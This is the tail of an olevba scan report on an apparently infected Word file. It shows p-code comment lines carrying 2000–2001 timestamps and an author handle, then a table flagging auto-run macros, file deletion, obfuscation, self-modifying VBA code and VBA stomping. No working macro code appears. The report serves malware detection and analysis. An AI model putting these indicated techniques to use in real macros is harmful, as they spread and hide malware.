' Line #263:
' Line #264:
' Line #265:
' Line #266:
' 	QuoteRem 0x0000 0x002A " 03:13:143:13:14 PM PM-Tuesday, 8 Feb 2000"
' Line #267:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #268:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' 	QuoteRem 0x0000 0x0024 " 09:37:279:37:27 -Kamis, 30 Mar 2000"
' Line #274:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #275:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' Line #280:
' 	QuoteRem 0x0000 0x0026 " 02:46:2914:46:29 -Selasa, 25 Apr 2000"
' Line #281:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #282:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #283:
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' 	QuoteRem 0x0000 0x002C " 06:06:116:06:11 PM PM-Thursday, 13 Jul 2000"
' Line #288:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #289:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' 	QuoteRem 0x0000 0x0026 " 05:13:3217:13:32 -Monday, 28 Aug 2000"
' Line #295:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #296:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #297:
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' 	QuoteRem 0x0000 0x002C " 09:00:399:00:39 AM AM-Thursday, 12 Oct 2000"
' Line #302:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #303:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #304:
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0028 " 01:14:1413:14:14 -Thursday, 23 Nov 2000"
' Line #309:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #310:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #311:
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0028 " 08:40:5208:40:52 -Mittwoch, 21 Feb 2001"
' Line #316:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #317:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #318:
' Line #319:
' Line #320:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

